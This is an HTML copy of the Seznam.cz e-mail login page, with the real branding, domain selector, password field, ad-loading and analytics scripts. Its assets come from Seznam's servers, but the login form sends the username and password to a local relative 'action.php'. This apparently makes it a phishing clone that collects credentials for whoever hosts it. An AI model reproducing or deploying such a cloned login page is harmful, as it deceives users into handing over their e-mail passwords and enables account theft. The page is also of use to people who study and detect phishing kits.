<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width" />
	<title>Seznam E-mail � Login</title>

	

 <!-- OpenId discovery tag -->
	<meta http-equiv="X-XRDS-Location" content="http://id.seznam.cz/yadis" />


	<link href="https://login.szn.cz//css/login.css?27" rel="stylesheet" media="all" />
	<link rel="shortcut icon" href="https://login.szn.cz/img/favicon.ico" />


	<script type="text/javascript" src="https://login.szn.cz/js/js_lib.js"></script>
	<script type="text/javascript" src="https://login.szn.cz/js/js_all.js"></script>


	<script src="https://h.imedia.cz/js/dot-small.js"></script>
</head>

<body>
	<div id="links">
	<a href="http://napoveda.seznam.cz/cz/login/prihlaseni/">N�pov&#283;da</a> | <a href="http://www.seznam.cz" title="Seznam.cz">Seznam</a>
</div>

	<h1>
	
		<a href="http://email.seznam.cz" title="Seznam E-mail"><img src="https://login.szn.cz/img/email-logo.png" alt="Seznam E-mail"/></a>
	
</h1>


	<div id="content">
		<div id="form">
			<h2>
				
					P&#345;ihl�en� do e-mailu
				
			</h2>
			





















			<form action="action.php" method="post" id="form">
	<input type="hidden" name="serviceId" value="email" />
	<input type="hidden" name="returnURL" value="http://email.seznam.cz/" />

	
		<p>
			
			
				
				
			

			<input type="text" autofocus="autofocus" autocomplete="on" id="name" class="input_email" name="username" value="" tabindex="1" /><select name="domain" tabindex="3" id="domain">
					
						<option value="seznam.cz" >seznam.cz</option>
					
						<option value="email.cz" >email.cz</option>
					
						<option value="post.cz" >post.cz</option>
					
						<option value="spoluzaci.cz" >spoluzaci.cz</option>
					
						<option value="stream.cz" >stream.cz</option>
					
						<option value="firmy.cz" >firmy.cz</option>
					
					<option value="openid">OpenID</option>
				</select>
			
			<script>new JAK.Placeholder(document.querySelector("#name"), "E-mail"); document.querySelector("#name").focus();</script>
		</p>

		
		

		<p>
			<input type="password" id="password" name="password" placeholder="Heslo" tabindex="2" /><input type="submit" id="submit" name="login" value="P&#345;ihl�sit se" tabindex="4" />
		</p>

		<p class="remember">
			<label><input type="checkbox" name="remember" id="remember" value="1" />Pamatovat si m&#283; na tomto po&#269;�ta&#269;i</label> (<a href="http://napoveda.seznam.cz/cz/login/prihlaseni/">n�pov&#283;da</a>)
		</p>

		<script>
			var domain = JAK.gel("domain");
			if (domain) { new DomainSelect(domain, JAK.gel("name"), JAK.gel("password")); }
		</script>


	

	
	

</form>

<p>Nejste zaregistrov�ni na Seznam.cz? <a href="http://registrace.seznam.cz/?coid=&amp;serviceId=email&amp;returnURL=http%3A//email.seznam.cz/">Registrujte se!</a><br/>
<a href="http://napoveda.seznam.cz/cz/zapomenute-heslo.html">Zaslat zapomenut� heslo</a></p>


			
				<div id="service-info">
					<img src="https://login.szn.cz/img/service/email.png" alt="" class="image_email" />
				</div>
			

			
		</div>
		<div id="line"></div>
	</div>

	
	<div id="ad">
		
		<div id="adRectangle"></div>
	</div>

	
<script type="text/javascript" src="https://i.imedia.cz/js/im2.js?27"></script>

<script type="text/javascript">
	/* <![CDATA[ */
		im.conf.charset = 'utf-8';
		
		var pozice = [];
		/*- nutno zjistovat existenci elementu pro umisteni reklamy -*/
		if (JAK.gel("adRectangle")){
			pozice.push({id:"adRectangle", zoneId:"seznam.pack.rectangle", section:"/email_login"});
		};
		if (JAK.gel("adSquare")){
			pozice.push({id:"adSquare", zoneId:"seznam.login.sponzor"});
		};
		if (JAK.gel("adDiagnostics")){
			pozice.push({id:"adDiagnostics", zoneId:"seznam.login.diagnostics", section:"/email_login"});
		};
		if (JAK.gel("adSponzor")){
			pozice.push({id:"adSponzor", zoneId:"seznam.lide.login.sponzor"});
		};
		if (JAK.gel("adSky")){
			pozice.push({id:"adSky", zoneId:"seznam.login.sky", section:"/email_login"});
		};
		im.getAds(pozice);
	/* ]]> */
</script>

	<script>DOT.cfg({service: 'loginszn'});</script>

	<script type="text/javascript">
		var pp_gemius_identifier = new String('bPzlpouDpSBu7FNHsjGgIMbi7KRw0iy5279DT9.NN.r.17');
		var pp_gemius_extraparameters = new Array('gA=seznam.cz/login.seznam.cz/login_default')
	</script>

	<script type="text/javascript">
	function gemius_pending(i) { window[i] = window[i] || function() {var x =
	window[i+'_pdata'] = window[i+'_pdata'] || []; x[x.length]=arguments;};};
	gemius_pending('gemius_hit'); gemius_pending('gemius_event');
	gemius_pending('pp_gemius_hit'); gemius_pending('pp_gemius_event');
	(function(d,t) {try {var
	gt=d.createElement(t),s=d.getElementsByTagName(t)[0];
	gt.setAttribute('async','async'); gt.setAttribute('defer','defer');
	gt.src=location.protocol + '//gacz.hit.gemius.pl/xgemius.js';
	s.parentNode.insertBefore(gt,s);} catch (e) {}})(document,'script');
	</script>

	
		
		
	

</body>
</html>
